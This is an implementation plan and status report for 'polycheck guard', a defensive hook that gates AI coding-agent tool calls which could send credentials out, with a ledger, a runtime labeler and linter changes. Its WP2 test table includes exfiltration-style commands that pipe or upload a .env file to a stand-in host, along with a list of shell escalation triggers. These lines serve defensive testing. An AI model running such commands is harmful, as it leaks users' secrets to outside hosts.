# M0 implementation plan — `polycheck guard`, gating milestone

**Scope:** a `PreToolUse` hook that gates region-completing calls with a witness, a
session ledger, a capability-basis runtime labeler for `Bash`/`Read`/`WebFetch`/MCP,
and `gateKind: 'guard'` recognition in the linter. **No `PostToolUse`, no `observed`
basis, no `irreversible`, no subagent taint, no scoped grants** — those are M1–M3.

**Exit criteria:** functional A2 (gate fires exactly at the completing step) and A3
(`allow` unreachable) pass for the `vulnerable` and `webfetch-egress` fixtures;
`npm test` green; the repo still self-lints (`npm run self`) with the guard installed.

---

## STATUS: M0 complete — 98/98 tests green

| WP | state | landed as |
|---|---|---|
| WP0 | done | `src/guard/compat.mjs`, `spec/WP0-findings.md`, `experiments/guard-compat/` |
| WP1 | done | `src/guard/ledger.mjs` |
| WP2 | done | `src/guard/runtime-label.mjs`, `data/claude-code.runtime.labels.json` |
| WP3 | done | `src/guard/{decide,witness,emit,policy}.mjs` |
| WP4 | done | `bin/polycheck-guard.mjs`, `src/guard/{run,cli}.mjs`, `polycheck guard …` |
| WP5 | done | `scan/model/check/report.mjs` + 4 fixtures |
| WP6 | done | `test/guard-replay.test.mjs` |

### Deviations from this plan, and why

1. **The daemon is dropped, not deferred** (WP0). A daemon still needs a client
   process per call; a Node client pays the same 780 ms floor, and a non-Node
   client would forfeit the zero-dependency posture. `if` filters — which gate
   whether the process spawns at all — replace it.
2. **A5 restated as a marginal budget.** The guard's own work is ~5 ms; the node
   cold-start floor is the host's and not ours to promise away.
3. **`PermissionRequest` discovered** and left for M1 as the decoration surface.
   `permissionDecisionReason` renders, so M0 did not need it.
4. **`satisfiedAfter` added to `decide()`** — a bug the WP6 approved-channel test
   caught: regions overlap (`credential-egress ⊂ lethal-trifecta`), so one call
   can complete several, and granting only the *reported* region left the others
   permanently un-granted, re-prompting the same channel forever.
5. **The runtime default for an unknown TOOL flips the static one.** `label.mjs`
   treats an unlabeled tool as effect-free (it can only reason about rules a user
   wrote); at runtime the call is really happening, so effect-free would be a
   hole. Worst-case is affordable only because the guard cannot emit `allow`.

### Known limitations carried into M1

- **Grants are issued optimistically at gating time.** The host never tells the
  guard the human's answer, so a *denied* call still suppresses a re-prompt for
  that channel. M1 revisits this with `PostToolUse` (which reveals whether the
  call ran).
- **`git push` yields no host** — a remote *name* is not a host, and resolving it
  needs repo config. It therefore issues no grant, which is the safe direction.
- **`observed` basis is defined but unused.** M0 is capability-only; the evidence
  pass is M1.
- **A path-shaped `providerKey` for `Read`** (`Read→.env`) reads oddly as a
  "channel". Harmless, but the egress side is the meaningful scope — revisit.

---

## WP0 — Compat spike (blocking, do first, timebox 1 day)

Everything else is written against whatever this finds. Do **not** start WP1 until
`compat.mjs` is pinned.

1. Install a trivial `PreToolUse` hook that dumps stdin to a file. Record the exact
   payload: field names, whether `session_id` is present, `tool_input` shape per
   tool, `cwd`.
2. Verify the output contract: does `{}` (no `permissionDecision`) cleanly pass
   through to the normal rules + classifier path? **This is the passthrough
   mechanism the whole design rests on.** If `{}` is not a valid passthrough, find
   what is (omitting `hookSpecificOutput`, exit 0 with empty stdout, …) before
   proceeding.
3. Verify `ask` renders `permissionDecisionReason` visibly, and that a guard `ask`
   on a call the rules already gate produces **one** prompt, not two (A1b).
4. Confirm `SessionStart` fires with a `source` field and the same `session_id`.
5. Measure cold-start latency of `node bin/polycheck-guard.mjs` doing nothing, on
   Windows. Record it. This decides §9 of the technical spec.

**Deliverable:** `src/guard/compat.mjs` with the pinned field names and a version
guard, plus the measured numbers written into the technical spec §9.

**Kill criteria:** if `{}` cannot pass through, M0 stops and we re-plan — the
alternative (always `ask`) is a different, much noisier product and needs your call.

---

## WP1 — Ledger (`src/guard/ledger.mjs`)

- Schema per technical §3.2, `v: 1`, capability basis only (`held.observed` written
  as an empty array, reserved).
- State dir resolution: `%LOCALAPPDATA%\polycheck` / `$XDG_STATE_HOME`, `0600`.
- Atomic write (temp + rename); load-or-empty; digest compute/verify.
- I4 quarantine path: digest mismatch → fresh ledger + sticky-ask flag.
- Step cap with first-contributor preservation (§9).

**Tests:** round-trip, corrupt-file quarantine, missing-file → empty, atomicity
under simulated mid-write crash, step-cap preserves origin steps.

---

## WP2 — Runtime labeler (`src/guard/runtime-label.mjs`) — the long pole

- Export `labelCall(toolName, toolInput, labels, {cwd})` per technical §5.1.
- Promote `coversSensitive` / `globToRe` / `normPath` / `anyMatch` from
  `src/label.mjs` to named exports. **No behaviour change to `label.mjs`** — pure
  export surface, existing tests must stay green untouched.
- Non-shell tools (§5.2): `Read`/`Grep`/`Glob` concrete-path matching,
  `WebFetch`/`WebSearch`, MCP verb matching.
- Shell (§5.3): tokenize/split on `; && || |` and newlines; per-command lookup in a
  new `data/claude-code.runtime.labels.json`; **escalation triggers → worst-case**
  (`$(…)`, backticks, `eval`, `source`, variable-in-executable-position, plus the
  existing `bashArbitraryExecution` list); unknown executable → worst-case.
- Every effect carries `{certainty, ruleId, evidence}` — `ruleId` is non-negotiable,
  it is what makes a bad gate debuggable.

**Tests:** a table of ~60 real command strings. Each asserts effects *and* `ruleId`.
Must include: `curl -T .env https://x`, `curl https://api.example.com` (egress, not
sensitive), `cat .env | curl -d @- https://x` (split + union), `eval "$(…)"`
(worst-case), `git push origin main`, `npm run build` (worst-case, existing list),
`rm -rf ./build` (no effect at M0 — `irreversible` is M2), unknown binary.

---

## WP3 — Decision engine (`src/guard/decide.mjs`, `witness.mjs`, `emit.mjs`)

- `decide()` exactly as technical §4.2, returning `'ask' | 'deny' | null`.
- `emit.mjs` is the **only** stdout writer; closed union; `null` → `{}`.
- `witness.mjs` renders the numbered path from `ledger.steps`, marking which step
  first contributed each required effect and marking the current call.
- `policy.mjs` at M0 is just `alreadyGates(call)` over `scanRepo(cwd)` — reporting
  only, per technical §6.

**Tests:** mask-algebra unit tests over synthetic ledgers; witness renders the
minimal set of contributing steps, not the whole history.

---

## WP4 — Hook entry (`bin/polycheck-guard.mjs`) + CLI wiring

- Subcommands: `guard hook pre`, `guard hook session-start`, `guard init`,
  `guard off`, `guard status`. (`explain`/`replay` are M1.)
- Fail-closed wrapper: any throw/timeout → `ask` + stderr diagnostic, exit 0.
- `guard init` runs `analyze(root)` first and reports the verdict (technical §8),
  writes hook wiring only on confirmation, refuses on a compat mismatch.
- Route through `bin/polycheck.mjs` so there is one binary.

**Tests:** fault injection — malformed stdin, unwritable state dir, forced throw,
each yields `ask` and exit 0.

---

## WP5 — `gateKind: 'guard'` in the linter (touches shipped code — review carefully)

This is the only WP that modifies existing behaviour. Per technical §2.0:

- `scan.mjs` — recognise the guard's hook command shape; emit
  `hooks[].kind = 'guard'` plus the parsed `onComplete` region set read from
  `.claude/polycheck.guard.json`. Any doubt → leave it as an ordinary hook.
- `model.mjs` — when a recognised guard hook covers a tool, set
  `gateKind: 'guard'`, `gateReason: "polycheck guard (gates regions: …)"`.
- `check.mjs` — `'guard'` is **not** in `UNVERIFIED`, but only for regions in the
  guard's `onComplete` set; for any other region it is treated as `'hook'`.
- `report.mjs` — a `PROOF` mediated by the guard prints the §2.0 soundness argument
  and the scope of the claim. It must not read as an unconditional green.
- Trip-wire test: assert `emit.mjs`'s decision union is exactly `'ask' | 'deny' |
  null`, with a comment at both sites explaining that widening it invalidates the
  verified-gate status.

**Fixtures:** `guard-verified` (guard installed + configured → `PROOF` with the
scoped claim), `guard-unconfigured` (hook present, config missing → `INCONCLUSIVE`,
i.e. G-a), `guard-lookalike` (hand-written hook that resembles the guard's command →
`INCONCLUSIVE`, i.e. G-b), `guard-partial` (guard configured for only one region →
that region `PROOF`, the other keeps its old verdict).

---

## WP6 — A2 replay tests

A minimal in-process driver that feeds a scripted call sequence through
`decide()` + `ledger`, no Claude Code required. For `vulnerable` and
`webfetch-egress`: walk the linter's own witness and assert the gate fires at the
last step **and at no earlier step**. This is the test that proves the two halves
agree — the deploy-time witness and the runtime gate are the same object.

---

## Sequencing

```
WP0 ──▶ WP1 ──┬─▶ WP3 ──▶ WP4 ──▶ WP6
       WP2 ───┘
       WP5 (independent of WP1–WP4; needs only the hook command shape from WP0)
```

WP2 and WP5 can run in parallel with WP1/WP3. WP0 blocks everything.

## Risks

| risk | mitigation |
|---|---|
| `{}` is not a valid passthrough | WP0 kill criterion — stop and re-plan rather than build on it |
| Node cold start blows the 50 ms budget | measure in WP0; daemon is out of M0 scope, so M0 may ship with a stated latency number rather than a passing A5 |
| WP5 changes verdicts on real repos | four fixtures pin the scoping; `npm run self` must stay stable |
| labeler noise (A1's category (b)) | not measurable until M1's replay corpus; M0 ships with the ruleId trail that makes it diagnosable |
